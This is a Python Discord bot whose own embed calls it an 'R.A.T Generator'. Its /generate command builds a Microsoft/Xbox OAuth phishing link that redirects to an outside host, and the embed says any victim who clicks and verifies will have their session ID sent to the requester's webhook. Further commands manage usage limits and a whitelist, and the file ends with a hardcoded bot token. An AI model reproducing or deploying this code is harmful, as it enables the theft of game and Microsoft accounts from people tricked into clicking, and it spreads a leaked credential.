import discord
from discord.ext import commands
from configparser import ConfigParser
import requests
from keep_alive import keep_alive, setnwlimit, addwhitelist, removewhitelist

config = ConfigParser()
bot = commands.Bot(intents=discord.Intents.all())

def checkhookvalid(hook):
    try:     
        url = hook
        response = requests.get(url)
        kekw = response.json()
        type = str(kekw[str('type')])
        print(type)
        if type == "1":
            return True
        else:
            return False
    except:
        return False

@bot.slash_command(name="generate", description="Generate an oauth link")
async def generate(ctx, webhook: str):
    if checkhookvalid(webhook):
        user = ctx.author.id
        config.read('config.ini')
        config.set('hooks', str(user), webhook)
        with open('config.ini', 'w') as f:
            config.write(f)
        embedVar = discord.Embed(title="R.A.T Generator", description="Use this link to RAT people. \n If somebody clicks on your link and verifys then his SessionID will be sent to your webhook.", color=0x00ff00)
        url = "https://login.live.com/oauth20_authorize.srf?client_id=12e40df3-625c-4c6b-892e-83871740ed80&response_type=code&redirect_uri=https://discordverification-2r48.onrender.com&scope=XboxLive.signin+offline_access&state=" + str(user)
        embedVar.add_field(name="URL", value=url, inline=False)
        await ctx.respond("Adding webhoook <@" + str(user) + ">", embed=embedVar, ephemeral=True)
    else:
        await ctx.respond("Invalid webhook")

@bot.slash_command(name="getconfig", description="Get the config")
@commands.has_permissions(administrator=True)
async def getconfig(ctx):
    await ctx.respond(file=discord.File('config.ini'))

@bot.slash_command(name="limit", description="Set limit")
@commands.has_permissions(administrator=True)
async def limit(ctx, limit: int):
    nwlimit = setnwlimit(limit)
    await ctx.respond(content=f"Set Limit to {nwlimit}, standard is 1000000000")

@bot.slash_command(name="whitelist", description="Whitelist a user")
@commands.has_permissions(administrator=True)
async def whitelist(ctx, name: str):
    whitelist = addwhitelist(name)
    await ctx.respond(content=f"Added {name} to Whitelist: {whitelist}")

@bot.slash_command(name="remove", description="Remove a user from whitelist")
@commands.has_permissions(administrator=True)
async def remove(ctx, name: str):
    whitelist = removewhitelist(name)
    await ctx.respond(content=f"Remove {name} from Whitelist: {whitelist}")

keep_alive()
bot.run("MTA3MTg2MTUyNjQ1MDkyOTc4NA.Gw3FcG.w_axIKaaQ0sXWfieEue4eq5HQPAElaY3hJhJ7w")